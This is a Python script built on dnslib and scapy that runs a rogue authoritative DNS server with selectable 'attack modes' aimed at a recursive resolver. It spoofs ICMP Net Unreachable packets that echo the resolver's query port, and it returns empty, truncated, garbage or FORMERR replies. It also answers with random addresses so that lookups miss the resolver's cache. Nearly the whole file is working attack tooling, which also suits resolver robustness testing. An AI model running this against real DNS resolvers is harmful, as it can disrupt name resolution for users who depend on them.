import argparse
import random
import time
import sys
import logging
import threading
import os
import socket

from dnslib import DNSHeader, RR, A, NS, SOA, QTYPE, DNSLabel, RCODE, DNSRecord
from dnslib.server import DNSServer, DNSLogger, DNSHandler

try:
    # Import the Raw class for directly filling raw bytes
    from scapy.all import IP, UDP, ICMP, DNS, DNSQR, send, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# --- Logging configuration ---
log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S')
handler.setFormatter(formatter)
log.addHandler(handler)

# --- Payload definitions ---
class RawPayload:
    def __init__(self, data):
        self.data = data
    def pack(self):
        return self.data
    def __len__(self):
        return len(self.data)

class SilentPayload:
    pass

# --- Custom Handler ---
class UltimateHandler(DNSHandler):
    def handle(self):
        data, connection = self.request
        try:
            request = DNSRecord.parse(data)
        except Exception:
            request = None

        # [Key] Pass the raw UDP data bytes to the resolver
        reply = self.server.resolver.resolve(request, self, raw_data=data)

        if isinstance(reply, SilentPayload):
            self.server.logger.log_reply(self, reply)
            return 
        if isinstance(reply, RawPayload):
            self.server.logger.log_reply(self, reply)
            connection.sendto(reply.pack(), self.client_address)
            return
        if reply:
            self.server.logger.log_reply(self, reply)
            connection.sendto(reply.pack(), self.client_address)

# --- Custom Logger ---
class AttackLogger(DNSLogger):
    def log_reply(self, handler, reply):
        if isinstance(reply, SilentPayload):
            log.info(f"[ATTACK] Handled via Scapy (UDP suppressed)")
        elif isinstance(reply, RawPayload):
            log.info(f"[ATTACK] Sent RawPayload ({len(reply)} bytes)")
        else:
            pass 
    def log_request(self, handler, request):
        pass

# --- Core resolver ---
class UltimateResolver:
    def __init__(self, target_domain, real_ip, delay, ttl, attack_mode, listen_ip, resolver_ip):
        self.target_domain = DNSLabel(target_domain)
        self.ns_domain = DNSLabel(f"ns.{target_domain}")
        self.real_ip = real_ip
        self.delay = delay
        self.ttl = ttl
        self.attack_mode = attack_mode.lower()
        self.listen_ip = listen_ip
        self.resolver_ip = resolver_ip

        if "icmp" in self.attack_mode and not SCAPY_AVAILABLE:
            log.error("Scapy missing for ICMP mode.")

    def generate_random_ip(self):
        return "10.{}.{}.{}".format(random.randint(1,254), random.randint(1,254), random.randint(1,254))

    def send_icmp_unreachable(self, target_ip, target_port, original_dns_payload):
        """
        Send ICMP Net Unreachable.
        """
        try:
            orig_ip = IP(src=target_ip, dst=self.listen_ip)
            orig_udp = UDP(sport=target_port, dport=53)
            original_packet = orig_ip / orig_udp
            icmp_pkt = IP(src=self.listen_ip, dst=target_ip) / \
                       ICMP(type=3, code=2) / \
                       original_packet
            
            send(icmp_pkt, verbose=1)
            log.warning(f"[SCAPY] Sent ICMP Net Unreachable (Matched ID) to {target_ip}:{target_port}")
        except Exception as e:
            log.error(f"[SCAPY ERROR] {e}")

    def resolve(self, request, handler, raw_data=b''):
        client_ip, client_port = handler.client_address
        
        # Basic information extraction
        if request:
            qname = request.q.qname
            qtype = request.q.qtype
        else:
            qname = DNSLabel("unknown")
            qtype = QTYPE.A

        log.info(f"[+] Query: {qname} ({QTYPE[qtype]}) from {client_ip}:{client_port}")
        if self.delay > 0:
            time.sleep(self.delay)

        # 1. NS queries (infrastructure) - must return normally
        if request and (qtype == QTYPE.NS or qname == self.ns_domain):
            reply = request.reply()
            reply.header.aa = True
            reply.add_answer(RR(qname, QTYPE.NS, rdata=NS(self.ns_domain), ttl=self.ttl))
            reply.add_ar(RR(self.ns_domain, QTYPE.A, rdata=A(self.real_ip), ttl=self.ttl))
            return reply

        # 2. Attack logic
        if self.attack_mode != 'normal':
            if self.attack_mode == 'icmp':
                threading.Thread(target=self.send_icmp_unreachable, 
                                 args=(self.resolver_ip, client_port, raw_data)).start()
                return SilentPayload()

            elif self.attack_mode == 'null':
                return RawPayload(b'')
            
            elif self.attack_mode == 'short':
                return RawPayload(b'\xde\xad\xbe\xef')
            
            elif self.attack_mode == 'garbage':
                return RawPayload(b'\xff' * 12)
            
            elif self.attack_mode == 'formerr':
                if request:
                    reply = request.reply()
                    reply.header.rcode = RCODE.FORMERR
                    return reply
                return RawPayload(b'')

        # 3. Normal business logic
        if not request: return None

        if qtype == QTYPE.AAAA:
            reply = request.reply()
            reply.header.aa = True
            reply.add_auth(RR(self.target_domain, QTYPE.SOA, 
                           rdata=SOA(self.ns_domain, DNSLabel("admin"), times=(int(time.time()), 7200, 3600, 1209600, 60)), ttl=60))
            return reply

        if qtype == QTYPE.A:
            reply = request.reply()
            reply.header.aa = True
            val = self.real_ip if qname == self.ns_domain else self.generate_random_ip()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(val), ttl=self.ttl))
            reply.add_auth(RR(self.target_domain, QTYPE.NS, rdata=NS(self.ns_domain), ttl=self.ttl))
            reply.add_ar(RR(self.ns_domain, QTYPE.A, rdata=A(self.real_ip), ttl=self.ttl))
            return reply

        reply = request.reply()
        reply.header.rcode = RCODE.SERVFAIL
        return reply

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--domain', required=True)
    parser.add_argument('--ip', required=True)
    parser.add_argument('--rip', required=True)
    parser.add_argument('--delay', type=float, default=0)
    parser.add_argument('--ttl', type=int, default=60)
    parser.add_argument('--port', type=int, default=53)
    parser.add_argument('--listen-ip', default="0.0.0.0")
    parser.add_argument('--attack-mode', default='normal', choices=['normal', 'icmp', 'null', 'short', 'formerr', 'garbage'])
    
    args = parser.parse_args()

    if args.attack_mode == 'icmp':
        if not SCAPY_AVAILABLE or os.geteuid() != 0:
            print("[Error] ICMP mode requires Scapy and sudo.")
            sys.exit(1)
        if args.listen_ip == "0.0.0.0":
            print(f"[Warning] ICMP spoofing needs real IP, use {args.ip} as listen IP.")

    logger = AttackLogger(prefix=False)
    resolver = UltimateResolver(args.domain, args.rip, args.delay, args.ttl, args.attack_mode, args.listen_ip if args.listen_ip != "0.0.0.0" else args.ip, args.rip)
    
    server = DNSServer(resolver, port=args.port, address=args.listen_ip, logger=logger, handler=UltimateHandler)

    print(f"[*] Server running on {args.listen_ip}:{args.port}")
    print(f"[*] Attack Mode: {args.attack_mode.upper()}")
    
    try:
        server.start()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] Server Error: {e}")
    finally:
        server.stop()

if __name__ == '__main__':
    main()